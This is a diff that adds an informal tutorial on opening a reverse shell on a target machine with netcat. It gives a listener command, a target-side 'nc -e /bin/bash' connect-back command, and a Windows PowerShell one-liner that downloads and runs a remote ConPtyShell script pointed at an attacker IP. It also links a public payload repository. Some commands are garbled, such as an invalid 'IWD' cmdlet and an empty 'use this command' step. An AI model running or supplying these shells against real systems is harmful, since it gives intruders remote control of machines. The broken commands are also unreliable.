@@ -1,0 +1,45 @@
+this is an explaination as to how you will be able to use netcat (nc) to wage a reverse shell on the target system to get started using netcat use:
+
+**remember a reverse shell is essentially your target system reaching out to a device that you have setup as a 'listener' because often time firewalls arent stopping
+you from outbound connections (on the target system that is) also make sure that the target device NEEDS to have netcat installed on it already.
+
+to prepare a listener on the attacking computer just use the command:
+
+$ nc -lnvp <port> -s 
+*l = listen
+*n = no dns (ip addresses only)
+*v = verbose
+*p = port (need to specify right after, try to keep this a top port that is not being used on the system)
+*s = source (need to specify right after, this is the IP address of the device you are listening from)
+
+on the device you are going to be hosting the reverse shell from make sure to run kali or an OS that is using the traditional netcat for nc -e option.
+
+the command that would be for a device using traditional netcat:
+
+$ nc -e /bin/bash <listener_IP> <port>
+
+once this command is ran you will see something that says: "Connection from "____" received!"
+
+now if you press enter a few times you can start running some commmands and it will be using that shell that you offered from the target machine "/bin/bash"
+
+usually listeners like this need to be downloaded or injected using metasploit
+
+now on windows you will need to use this command:
+
+you can choose to install netcat on the target pc using a payload OR wage the attack using built in tools like powershell
+
+you can also refer to or clone the github repo "payloads all the things" from here:
+
+https://github.com/swisskyrepo/PayloadsAllTheThings.git
+
+this shows you how to execute all these scripts on multiple different platforms!
+
+the command that would need to run on the server side:
+
+stty raw -echo; (stty size; cat) | nc -lvnp 87 -s <listener_ip_address>
+
+the payload that needs to run on the target windows device would be:
+
+IEX(IWD https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <attacker_IP> <port>
+
+
